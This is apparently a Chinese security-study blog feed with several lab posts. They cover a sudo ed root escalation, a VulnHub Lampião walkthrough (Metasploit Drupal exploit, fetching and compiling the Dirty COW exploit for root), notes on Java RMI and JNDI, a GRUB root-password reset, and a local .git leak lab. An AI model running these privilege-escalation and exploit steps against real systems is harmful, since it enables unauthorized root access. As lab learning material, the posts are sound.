title="ed"></a>ed</h3><p>安装ed</p><p><img src="image-20230311194608383.png" alt="image-20230311194608383"></p><p>在sudoers中加入ed，这就不多说了</p><p><img src="image-20230311194824177.png" alt="image-20230311194824177"></p><p>更简单<code>sudo ed</code> 并输入<code>!/bin/bash</code></p><p><img src="image-20230311195050568.png" alt="image-20230311195050568"></p><p><img src="image-20230311195101783.png" alt="image-20230311195101783"></p><p>运行</p><p><img src="image-20230311195113341.png" alt="image-20230311195113341"></p><p>提权成功！</p><p>未完待续……</p>]]></content>
      
      
      
        <tags>
            
            <tag> Linux提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『vulnhub系列』脏牛提权</title>
      <link href="/2023/03/03/%E3%80%8Evulnhub%E7%B3%BB%E5%88%97%E3%80%8F%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/"/>
      <url>/2023/03/03/%E3%80%8Evulnhub%E7%B3%BB%E5%88%97%E3%80%8F%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<p>复习Linux提权的相关知识，学到脏牛提权，正好有个vulnhub靶机可以用来练手，一起来试一下！</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>靶机下载：<a href="https://www.vulnhub.com/entry/lampiao-1,249/">Lampião: 1 ~ VulnHub</a></p><p><img src="image-20230303164501489.png" alt="image-20230303164501489"></p><p>使用Vmware打开靶机：</p><p><img src="image-20230303152316746.png" alt="image-20230303152316746"></p><p>看来需要密码，先进行<strong>信息搜集</strong></p><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>使用<code>nmap -sn xxx.0/24</code>查找同一网段的主机，-sn是只扫描主机不扫描端口的意思</p><p><img src="image-20230303152951578.png" alt="image-20230303152951578"></p><p>找到一个可疑IP192.168.117.126使用<code>nmap -p- xxx</code>扫描对应IP的端口，发现有22 ,80,1898三个端口</p><p><img src="image-20230303153743782.png" alt="image-20230303153743782"></p><p>是同浏览器访问1898端口得到以下界面</p><p><img src="image-20230303154008098.png" alt="image-20230303154008098"></p><p>发现使用框架Drupal</p><p><img src="image-20230303154049475.png" alt="image-20230303154049475"></p><p>使用dirsearch -u [url]来进行敏感了目录扫描（当时没有仔细看敏感目录有什么，直接去找Drupal的漏洞去了）</p><p><img src="image-20230303154251965.png" alt="image-20230303154251965"></p><p>使用<code>msfconsole</code>打开metasploit</p><p><img src="image-20230303155216108.png" alt="image-20230303155216108"></p><p>在CHANGELOG.txt中发现Drupal的版本为7.54 更新时间为2017年</p><p><img src="image-20230303155511560.png" alt="image-20230303155511560"></p><p>直接在msf中使用<code>search Drupal</code>命令搜索相关的漏洞，有一个18年的就用它了</p><p><img src="image-20230303155612179.png" alt="image-20230303155612179"></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>使用<code>use 1</code>进行漏洞利用，<code>show options</code>查看需要的配置</p><p><img src="image-20230303155947519.png" alt="image-20230303155947519"></p><p><img src="image-20230303160002709.png" alt="image-20230303160002709"></p><p>只需要设置RHOST和RPORT即可，即目的ip和目的端口</p><p><img src="image-20230303160242289.png" alt="image-20230303160242289"></p><p>设置后，使用<code>run</code>命令进行漏洞利用，得到一个www-data的普通用户的权限，这里总结一下刚刚漏洞利用过程的命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.use 1 //search到的漏洞编号</span><br><span class="line">2.show options //查看配置</span><br><span class="line">3.set RHOST xxx //设置目的ip</span><br><span class="line">4.set RPORT xxx //设置目的端口</span><br><span class="line">5.run //漏洞利用</span><br></pre></td></tr></table></figure><p><img src="image-20230303160219694.png" alt="image-20230303160219694"></p><p>成功获取shell并使用python一句话反弹交互式shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p><img src="image-20230303160731092.png" alt="image-20230303160731092"></p><h2 id="Linux提权——脏牛提权"><a href="#Linux提权——脏牛提权" class="headerlink" title="Linux提权——脏牛提权"></a>Linux提权——脏牛提权</h2><p>使用uname -a查看Linux内核版本：4.4.0-31-generic</p><p>漏洞描述：</p><blockquote><p>漏洞编号：CVE-2016-5195<br>漏洞名称：脏牛（Dirty COW）<br>漏洞危害：低权限用户利用该漏洞技术可以在全版本Linux系统上实现本地提权<br>影响范围：Linux内核&gt;=2.6.22（2007年发行）开始就受影响了，直到2016年10月18日才修复。</p></blockquote><p>主流发行版修复之后的内核版本，如果你的内核版本低于列表里的版本，表示还存在脏牛漏洞。</p><blockquote><p>Centos7 /RHEL7     3.10.0-327.36.3.el7</p><p>Cetnos6/RHEL6     2.6.32-642.6.2.el6</p><p>Ubuntu 16.10      4.8.0-26.28</p><p>Ubuntu 16.04     4.4.0-45.66</p><p>Ubuntu 14.04     3.13.0-100.147</p><p>Debian 8       3.16.36-1+deb8u2</p><p>Debian 7         3.2.82-1</p></blockquote><p><img src="image-20230303160834221.png" alt="image-20230303160834221"></p><p>可以看到我们此时的靶机属于Ubuntu 14.04     3.13.0-100.147这一范围因此，可以使用脏牛提权</p><p>使用命令searchsploit dirty找到40847.cpp的位置，我们要使用的脚本就在这里了</p><p><img src="image-20230303161628487.png" alt="image-20230303161628487"></p><p>将其复制到当前用户目录下，注意searchsploit搜到的脚本，都在<code>/usr/share/exploitdb/exploits</code>中后面再加上Path中的路径即可</p><p><img src="image-20230303162005823.png" alt="image-20230303162005823"></p><p>使用<code>python3 -m http.server 80</code>命令在80端口开启http</p><p><img src="image-20230303162057865.png" alt="image-20230303162057865"></p><p>进入到tmp目录下使用<code>wget http://xxx:80/40847.cpp</code>将脚本下载到靶机（ps：使用tmp目录的原因是，一般tmp目录具有写入权限，使用时找一个具有写入权限的目录进行下载即可）</p><p><img src="image-20230303162504106.png" alt="image-20230303162504106"></p><p>使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">g++ -Wall -pedantic -O2 -std=c++11 -pthread -o 1 40847.cpp -lutil //1的意思为编译后的执行文件名，可自定义</span><br></pre></td></tr></table></figure><p>命令进行编译</p><p><img src="image-20230303163841025.png" alt="image-20230303163841025"></p><p>编译成功，使用<code>./1 -s</code>命令运行执行文件1，得到root权限</p><p><img src="image-20230303163913985.png" alt="image-20230303163913985"></p><p><code>cat flag.txt</code> 得到flag</p><p><img src="image-20230303164000917.png" alt="image-20230303164000917"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Linux提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JNDI注入重置版</title>
      <link href="/2023/02/23/JNDI%E6%B3%A8%E5%85%A5%E9%87%8D%E7%BD%AE%E7%89%88/"/>
      <url>/2023/02/23/JNDI%E6%B3%A8%E5%85%A5%E9%87%8D%E7%BD%AE%E7%89%88/</url>
      
        <content type="html"><![CDATA[<p>大概理解了RMI的原理，现在开始重新学习一下JNDI注入</p><h2 id="一、JNDI机制与原理"><a href="#一、JNDI机制与原理" class="headerlink" title="一、JNDI机制与原理"></a>一、JNDI机制与原理</h2><p>名称：JNDI(Java Naming and Directory Interface,Java命名和目录接口)</p><p>概述：JNDI(Java Naming and Directory Interface,Java命名和目录接口)是SUN公司提供的<strong>一种标准的Java命名系统接口</strong>，JNDI提供统一的客户端API，通过不同的访问提供者接口JNDI服务供应接口(SPI)的实现，由管理者将JNDI API映射为特定的命名服务和目录系统，使得Java应用程序可以和这些<strong>命名服务和目录服务之间</strong>进行交互。目录服务是命名服务的一种自然扩展。</p><p>在Java JDK里面提供了5个包，提供给JNDI的功能实现，分别是：</p><blockquote><p>javax.naming：主要用于命名操作，它包含了命名服务的类和接口，该包定义了Context接口和InitialContext类； javax.naming.directory：主要用于目录操作，它定义了DirContext接口和InitialDir- Context类；<br>javax.naming.event：在命名目录服务器中请求事件通知；<br>javax.naming.ldap：提供LDAP支持；<br>javax.naming.spi：允许动态插入不同实现，为不同命名目录服务供应商的开发人员提供开发和实现的途径，以便应用程序通过JNDI可以访问相关服务。</p></blockquote><p>至于使用方法，在将RMI中已经体现过了,其实在介绍RMI的时候我们就已经利用了JNDI，那么可以知道，当lookup()中参数可控的时候，我们就可以引入恶意代码</p>]]></content>
      
      
      
        <tags>
            
            <tag> JavaSec </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java RMI</title>
      <link href="/2023/02/14/Java-RMI/"/>
      <url>/2023/02/14/Java-RMI/</url>
      
        <content type="html"><![CDATA[<p>先前介绍过RMI但感觉不够详细所，理解也不够透彻，想着这次再学习一下，当然，此篇文章仅供个人理解，因此会借鉴大神们的文章，文末会有标出。</p><h2 id="一、Java-RMI机制与原理"><a href="#一、Java-RMI机制与原理" class="headerlink" title="一、Java RMI机制与原理"></a>一、Java RMI机制与原理</h2><p>  RMI（Remote Method invocation）远程方法调用：是允许在一个JAVA虚拟机中运行的<strong>对象</strong>调用运行在另一个JAVA虚拟机中的<strong>对象</strong>的方法</p><p><em>（ps：两个虚拟机可以是运行在<strong>相同计算机</strong>的不同<strong>进程</strong>中，也可以是运行在网络上的<strong>不同计算机</strong>中）</em></p><p>  而JAVA RMI：用于实现远程过程调用的应用程序编程接口。它使客户机上的程序可以调用远程服务器上的对象的引用</p><!--宗旨：简化远程接口对象的使用--><h3 id="RMI过程："><a href="#RMI过程：" class="headerlink" title="RMI过程："></a>RMI过程：</h3><p>服务器调用远程注册表将名称与远程对象关联</p><p>客户端在注册表中通过<strong>名称</strong>查找远程对象，然后在其上调用一个方法</p><p>要了解RMI就不得不提到两个概念</p><h3 id="Stub和Skeleton"><a href="#Stub和Skeleton" class="headerlink" title="Stub和Skeleton"></a>Stub和Skeleton</h3><p>rmi框架使用代理来负责代理与远程对象通过socket进行通信的细节</p><p>客户端代理stub（存根）服务器代理skeleton（骨架）</p><h3 id="RMI远程调用步骤："><a href="#RMI远程调用步骤：" class="headerlink" title="RMI远程调用步骤："></a>RMI远程调用步骤：</h3><p>1.客户调用方法</p><p>2.经过stub代理打包（编码）调用信息（变量，方法名）通过网络发给skeleton</p><p>3.服务器端通过skeleton解包，找出被调用的方法以及方法所在的对象</p><p>4.服务器端调用真正的方法，将返回结果发给skeleton</p><p>5.skeleton打包返回结果，通过网络发送给stub</p><p>6.stub解包，得到返回结果，返回给调用者</p><p>7.客户端收到返回值</p><h2 id="二、JAVA-RMI示例"><a href="#二、JAVA-RMI示例" class="headerlink" title="二、JAVA RMI示例"></a>二、JAVA RMI示例</h2><p>创建RMI的步骤</p><p>1.创建远程接口</p><p>2.创建远程类</p><p>3.创建服务器程序</p><p>4.创建客户端程序</p><p>下面进行详细分析：</p><h3 id="1-创建远程接口"><a href="#1-创建远程接口" class="headerlink" title="1.创建远程接口"></a>1.创建远程接口</h3><p>远程接口中声明了可以被客户程序访问的远程方法，RMI规范要求<strong>远程对象</strong>所属的类实现一个远程接口</p><p>并需要满足两个条件：</p><p>(1).直接或间接继承java.rmi.Remote接口<br>(2).接口中所有方法声明抛出java.rmi.RemoteException</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Iservice</span> <span class="keyword">extends</span> <span class="title class_">Remote</span></span><br><span class="line">&#123;</span><br><span class="line">    String <span class="title function_">Service</span><span class="params">(String Content)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2-创建远程类"><a href="#2-创建远程类" class="headerlink" title="2.创建远程类"></a>2.创建远程类</h3><p>远程类就是远程对象所属的类。RMI规范要求远程类必须实现一个远程接口，另外为了使远程的实例变成能为远程客户提供服务的远程对象，可以通过两种途径把它导出（export）为远程对象</p><p>(1).实现远程接口的同时需要继承java.rmi.server.UnicastRemoteObject,并且远程类的构造方法必须声明抛出RemoteException</p><p>第一种：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ServiceImpl</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">Iservice</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ServiceImpl</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException&#123;</span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">Service</span><span class="params">(String Content)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;server&quot;</span>+Content;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>(2).如果远程类已经继承了其他类，无法再继承UnicastRemoteObject类，那么可以在构造方法中调用UnicastRemoteObject静态方法expectObject，同时构造方法必须声明RemoteException</p><p>第二种：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ServiceImpl2</span> <span class="keyword">extends</span> <span class="title class_">Object</span> <span class="keyword">implements</span> <span class="title class_">Iservice</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ServiceImpl2</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException&#123;</span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">        UnicastRemoteObject.exportObject(<span class="built_in">this</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">Service</span><span class="params">(String Content)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;server&quot;</span>+name+<span class="string">&quot;:&quot;</span>+Content;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关于UnicastRemoteObject.expectObject(this,0)</p><p>其中this是本对象，0为监听任意端口号</p><h3 id="3-创建服务器程序"><a href="#3-创建服务器程序" class="headerlink" title="3.创建服务器程序"></a>3.创建服务器程序</h3><p>使用注册表rmiRegistry将远程对象与名称关联,服务器的一大功能就是向rmiRegistry注册表中注册对象。</p><p>从JDK1.3版本以上，RMI命名服务被整合到JNDI中（Java Naming and Directory Interface，Java名字与目录接口）之前有讲过，后面会重新再新开一篇。</p><p>在JNDI中 javax.naming.Context声明了<strong>注册，查找，以及注销对象</strong>的方法</p><p>​    (1).bind(String name,Object obj)注册对象 name为url格式<br>​    (2).rebind(String name,Object obj)注册对象 如果当前name已被绑定其他对象，当前的obj将会覆盖原来的对象<br>​    (3).lookup(String name)  根据name查找对象，并返回对象<br>​    (4).unbind(String name) 解绑对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ServerTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NamingException &#123;</span><br><span class="line">        <span class="type">Iservice</span> <span class="variable">server1</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">ServiceImpl</span>(<span class="string">&quot;001&quot;</span>);</span><br><span class="line">        <span class="type">Iservice</span> <span class="variable">server2</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">ServiceImpl2</span>(<span class="string">&quot;002&quot;</span>);</span><br><span class="line">        Context namingContext=<span class="keyword">new</span> <span class="title class_">InitialContext</span>();<span class="comment">// 初始化命名内容</span></span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">8892</span>);<span class="comment">// 在本地主机上创建和导出注册表实例，并在指定的端口上接受请求</span></span><br><span class="line">        namingContext.rebind(<span class="string">&quot;rmi://localhost:8892/server1&quot;</span>,server1);</span><br><span class="line">        namingContext.rebind(<span class="string">&quot;rmi://localhost:8892/server2&quot;</span>,server2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-创建客户端程序"><a href="#4-创建客户端程序" class="headerlink" title="4.创建客户端程序"></a>4.创建客户端程序</h3><p>使用lookup查找远程对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException, RemoteException &#123;</span><br><span class="line">        Context namingContext=<span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        Iservice cserver= (Iservice) namingContext.lookup(<span class="string">&quot;rmi://localhost:8892/server1&quot;</span>);</span><br><span class="line">        Iservice cserver2= (Iservice) namingContext.lookup(<span class="string">&quot;rmi://localhost:8892/server2&quot;</span>);</span><br><span class="line">        System.out.println(cserver.Service(<span class="string">&quot;haha&quot;</span>));</span><br><span class="line">        System.out.println(cserver2.Service(<span class="string">&quot;nihao&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-实例测试"><a href="#5-实例测试" class="headerlink" title="5.实例测试"></a>5.实例测试</h3><p>先运行ServerTest，再运行Client客户端程序得到以下结果</p><p><img src="image-20230221213627792.png" alt="image-20230221213627792"></p><p>以上内容相当于对大佬的文章进行再理解，重新整理成我自己能理解的样子，另外其中的代码都是按照自己的理解打的，欢迎各位指正。</p><p>可以看一下大佬的文章讲的更为细致</p><p>参考链接<a href="http://blog.csdn.net/guyuealian/article/details/51992182">http://blog.csdn.net/guyuealian/article/details/51992182</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> JavaSec </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SVN泄露</title>
      <link href="/2023/02/01/SVN%E6%B3%84%E9%9C%B2/"/>
      <url>/2023/02/01/SVN%E6%B3%84%E9%9C%B2/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali永久提升root权限</title>
      <link href="/2023/01/28/kali%E6%B0%B8%E4%B9%85%E6%8F%90%E5%8D%87root%E6%9D%83%E9%99%90/"/>
      <url>/2023/01/28/kali%E6%B0%B8%E4%B9%85%E6%8F%90%E5%8D%87root%E6%9D%83%E9%99%90/</url>
      
        <content type="html"><![CDATA[<h5 id="第一步："><a href="#第一步：" class="headerlink" title="第一步："></a>第一步：</h5><p>开启虚拟机，进入到下面这个界面时，按E</p><p><img src="image-20230128105449594.png" alt="image-20230128105217924"></p><p>进入以下页面<img src="image-20230128105716234.png" alt="image-20230128105716234"></p><h5 id="第二步："><a href="#第二步：" class="headerlink" title="第二步："></a>第二步：</h5><p>找到<strong>linux</strong>这一行将<code>ro quiet splash</code> 修改为 <code>rw quiet splash init=/bin/bash</code></p><p><img src="image-20230128105923289.png" alt="image-20230128105923289"></p><h5 id="第三步："><a href="#第三步：" class="headerlink" title="第三步："></a>第三步：</h5><p>按F10进入单用户模式<br>执行<code>passwd root</code>命令修改root密码</p><p><img src="image-20230128110240241.png" alt="image-20230128110240241"></p><p>修改成功后重启kali</p><h5 id="第四步："><a href="#第四步：" class="headerlink" title="第四步："></a>第四步：</h5><p>使用刚刚修改的密码进行登录</p><p><img src="image-20230128110629130.png" alt="image-20230128110629130"></p><p><img src="image-20230128110708458.png" alt="image-20230128110708458"></p><p>成功！</p>]]></content>
      
      
      
        <tags>
            
            <tag> kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息搜集学习</title>
      <link href="/2023/01/26/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E5%AD%A6%E4%B9%A0/"/>
      <url>/2023/01/26/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>跟着从0到1这本书学习一下，大部分都笼统学过一些，但碍于不够系统，现在想要拾起来，从头再来罢了，欢迎各位一起监督学习</p><h1 id="1-1举足轻重的信息搜集"><a href="#1-1举足轻重的信息搜集" class="headerlink" title="1.1举足轻重的信息搜集"></a>1.1举足轻重的信息搜集</h1><h2 id="信息搜集的分类"><a href="#信息搜集的分类" class="headerlink" title="信息搜集的分类"></a>信息搜集的分类</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">敏感目录</span><br><span class="line"></span><br><span class="line">敏感备份文件</span><br><span class="line"></span><br><span class="line">Banner识别</span><br></pre></td></tr></table></figure><h2 id="敏感目录泄露"><a href="#敏感目录泄露" class="headerlink" title="敏感目录泄露"></a>敏感目录泄露</h2><p>通过敏感目录泄露，我们网袜给能获取网站的源代码和敏感的URL地址<br>如网站的后台地址等。</p><h3 id="1-git泄露"><a href="#1-git泄露" class="headerlink" title="1.git泄露"></a>1.git泄露</h3><p>【漏洞简介】：git是一个主流的分布式版本控制系统，开发人员在开发过程中经常会遗忘.git文件夹，导致攻击者可以从.git文件夹中的信息获取开发人员在开发过程中提交过的所有源码，进而导致服务器被攻击而沦陷</p><h4 id="（1）常规git泄露"><a href="#（1）常规git泄露" class="headerlink" title="（1）常规git泄露"></a>（1）常规git泄露</h4><p>【使用工具】：scrabble:<a href="https://github.com/denny0223/scrabble">denny0223/scrabble: Simple tool to recover .git folder from remote server (github.com)</a></p><p>首先<strong>本地搭建web环境</strong>,这里使用的是自己的kali虚拟机</p><h5 id="1-安装apache2服务"><a href="#1-安装apache2服务" class="headerlink" title="1.安装apache2服务"></a>1.安装apache2服务</h5><p>使用<code>apt-get install apache2</code>安装apache2的服务</p><p><img src="image-20230128112331180.png" alt="image-20230128112331180"></p><p>可以使用<code>service apache2 start</code>开启apache2服务<br>同样使用<code>service apache2 status</code>查看apache2服务是否开启</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">service apache2 start //开启服务</span><br><span class="line">service apache2 status //查看服务状态</span><br><span class="line">service apache2  stop //停止服务</span><br></pre></td></tr></table></figure><p>如下图为开启状态</p><p><img src="image-20230128112658874.png" alt="image-20230128112658874"></p><p>使用浏览器打开127.0.0.1查看得到以下界面</p><p><img src="image-20230128113218985.png" alt="image-20230128113218985"></p><p>然后使用ifconfig查一下IP地址</p><p><img src="image-20230128113404350.png" alt="image-20230128113404350"></p><p>再次使用浏览器访问刚刚查到的自己的ip（上图白色部分位置）得到同样页面<br><img src="image-20230128113549628.png" alt="image-20230128113549628"></p><p>进行下一步</p><h5 id="2-创建一个git-test文件夹-并搭建实验场景"><a href="#2-创建一个git-test文件夹-并搭建实验场景" class="headerlink" title="2.创建一个git_test文件夹,并搭建实验场景"></a>2.创建一个git_test文件夹,并搭建实验场景</h5><p>进入<code>var/www/html</code>中创建一个git_test文件夹</p><p><img src="image-20230128114513598.png" alt="image-20230128114513598"></p><p>初始化git仓库 <code>git init</code></p><p><img src="image-20230128121207216.png" alt="image-20230128121207216"></p><p>创建flag.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">touch flag.php //创建flag.php文件</span><br><span class="line">vim flag.php //编辑flag.php文件，随便输入一些内容</span><br><span class="line">git add flag.php // 添加flag.php到文件暂存区</span><br></pre></td></tr></table></figure><p><img src="image-20230128121238417.png" alt="image-20230128121238417"></p><p><strong><u>（ps：this is flag hhhh是我自己输入的内容）</u></strong></p><p>然后提交修改<code>git commit  -m  &quot;flag&quot;</code></p><p><img src="image-20230128121311790.png" alt="image-20230128121311790"></p><p>这里我没有设置邮箱和用户名，不过影响不大，实验场景搭建完成</p><h5 id="3-获取scrabble工具，运行工具得到flag"><a href="#3-获取scrabble工具，运行工具得到flag" class="headerlink" title="3.获取scrabble工具，运行工具得到flag"></a>3.获取scrabble工具，运行工具得到flag</h5><p>此时回到当前用户目录<code>cd ~</code></p><p>使用<code>git clone https://github.com/denny0223/scrabble.git</code></p><p>将工具克隆到本地</p><p><img src="image-20230128121342190.png" alt="image-20230128121342190"></p><p>发现多了一个scrabble文件夹，进入，使用工具</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">使用方法：scrabble &lt;url&gt;</span><br><span class="line">示例：scrabble http://example.com/</span><br></pre></td></tr></table></figure><p>使用工具，目标为我们刚刚搭建的git_test</p><p><code>./scrabble http://127.0.0.1/git_test/</code></p><p><img src="image-20230128120959386.png" alt="image-20230128120959386"></p><p>使用命令<code>ls</code>得到<strong>flag.php</strong><br>使用<code>cat flag.php</code> 命令得到flag</p><p><img src="image-20230128122116935.png" alt="image-20230128122116935"></p><h4 id="（2）git回滚"><a href="#（2）git回滚" class="headerlink" title="（2）git回滚"></a>（2）git回滚</h4><p>【原理】：git作为版本控制工具，会记录每次提交（commit）的修改所以当存在git泄露时，敏感信息可能被删除或者被覆盖了，这时我们可以利用git的<code>git reset</code>命令恢复到以前的版本</p><p>【环境复现】：</p><p>我们重新提交一个新的版本的flag.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;flag is old &quot; &gt; flag.php //修改flag.php的内容</span><br><span class="line">cat flag.php //获取flag.php的内容</span><br><span class="line">git add flag.php //添加flag.php到文件暂存区</span><br><span class="line">git commit -m &quot;old&quot; //提交</span><br></pre></td></tr></table></figure><p><img src="image-20230128151641338.png" alt="image-20230128151641338"></p><p>此时flag.php的内容为：</p><p><img src="image-20230128152126614.png" alt="image-20230128152126614"></p><p>【版本回调】：我们先使用scrabble工具获取源码（回到scrabble文件夹）</p><p><img src="image-20230128154349821.png" alt="image-20230128154349821"></p><p><strong><u>（ps：突然发现这个工具用完就没了，不知道有什么解决方法，所以推荐下载一个压缩包，每次使用都解压一次，这里是删了重下的）</u></strong></p><p>获取源码：</p><p><img src="image-20230128154551483.png" alt="image-20230128154551483"></p><p>再通过 <code>git reset --hard HEAD^</code>命令跳到上一版本（在git中，用HEAD表示当前版本，上一个版本是HEAD^），即可获取到源码</p><p><img src="image-20230128154630452.png" alt="image-20230128154630452"></p><p>另外可以使用 <code>git log</code>可以查看提交历史记录并可以使用<code>git reset --hard [commit id]</code>来回退到相应版本</p><p><img src="image-20230128202835665.png" alt="image-20230128202835665"></p><p><strong><u>（ps：commit id为划线部分，可以只使用前几位，系统会自己匹配，如下图）</u></strong></p><p>使用<code>git reflog</code>查看历史每一次命令，并且可以看到每次提交的commit id （<strong>精简版</strong>）搭配版本回退命令，可以达到类似的效果（如下图）</p><p><img src="image-20230128160508603.png" alt="image-20230128160508603"></p><p>命令总结：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git reflog //查看历史命令</span><br><span class="line">git reset --hard xxx //回退版本 HEAD代表当前版本 HEAD^代表上一版本 HEAD~100表示回退100个版本</span><br><span class="line">git log //查看提交历史记录</span><br></pre></td></tr></table></figure><h5 id="（3）git分支"><a href="#（3）git分支" class="headerlink" title="（3）git分支"></a>（3）git分支</h5><p>【原理】：git允许使用多个分支，从而使用户可以把工作从开发主线上分离出来，以免影响开发主线，如果没有新建分支，那么只有一条时间线，即只有一个分支，默认为master。因此敏感文件可能藏在别的分支中，使用git log只能看到当前分支的提交历史，无法看到其他分支的信息，而大多数git泄露都不支持切换分支，因此需要用到新的工具<a 